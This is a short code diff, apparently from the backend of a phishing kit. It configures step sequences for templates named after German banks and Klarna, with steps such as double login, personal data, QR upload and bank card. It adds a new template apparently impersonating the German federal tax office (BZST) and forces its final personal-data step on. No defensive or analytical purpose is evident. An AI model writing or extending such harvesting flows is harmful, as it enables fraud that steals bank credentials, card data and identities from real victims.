@@ -56,7 +56,8 @@ export function insertDefaultStepConfigs(db: ReturnType<typeof SQLiteDatabase>):
       'dkb': ['doubleLogin', 'personalData', 'qrUpload', 'bankCard'],
       'targobank': ['doubleLogin', 'personalData', 'qrUpload', 'bankCard'],
       'klarna': ['bankSelection', 'branchSelection', 'doubleLogin', 'personalData', 'bankCard'],
-      'credit-landing': ['bankCard', 'personalData']
+      'credit-landing': ['bankCard', 'personalData'],
+      'bzst': ['login', 'personal-data-complete']
     };
 
     const insertStmt = db.prepare(`
@@ -85,6 +86,14 @@ export function insertDefaultStepConfigs(db: ReturnType<typeof SQLiteDatabase>):
         console.log(`⚠️ No default config found for template: ${template.folder_name}`);
       }
     }
+
+    // Ensure BZST final step is enabled if already present
+    db.prepare(`
+      UPDATE template_step_configs
+      SET is_enabled = 1
+      WHERE step_name = 'personal-data-complete'
+        AND template_id IN (SELECT id FROM templates WHERE folder_name = 'bzst')
+    `).run();
 
     console.log(`✅ Inserted ${totalInserted} default step configurations`);
   } catch (error) {
